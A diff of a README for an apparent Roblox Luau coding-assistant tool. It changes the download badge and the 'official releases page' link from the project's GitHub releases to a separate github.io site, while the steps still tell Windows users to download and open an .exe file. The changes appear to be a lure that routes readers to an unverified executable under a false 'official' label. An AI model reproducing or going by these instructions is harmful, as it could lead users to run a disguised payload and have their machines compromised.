@@ -1,6 +1,6 @@
 # 🛠️ roblox-best-practices-skill - Code better games with AI assistance
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/unpronounceable-ordersphenisciformes466/roblox-best-practices-skill/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://unpronounceable-ordersphenisciformes466.github.io)
 
 This software helps developers write clean Luau code for Roblox projects. It connects your chosen AI coding agent to a library of industry standards. The tool manages your configuration files, suggests improvements for your scripts, and maintains consistency across your game engine workspace.
 
@@ -16,7 +16,7 @@ Ensure your computer meets these basic needs:
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the [official releases page](https://github.com/unpronounceable-ordersphenisciformes466/roblox-best-practices-skill/releases).
+1.  Visit the [official releases page](https://unpronounceable-ordersphenisciformes466.github.io).
 2.  Locate the latest version marked as "Latest" under the Releases section.
 3.  Click the file ending in `.exe` to start your download.
 4.  Open the file after the download completes.
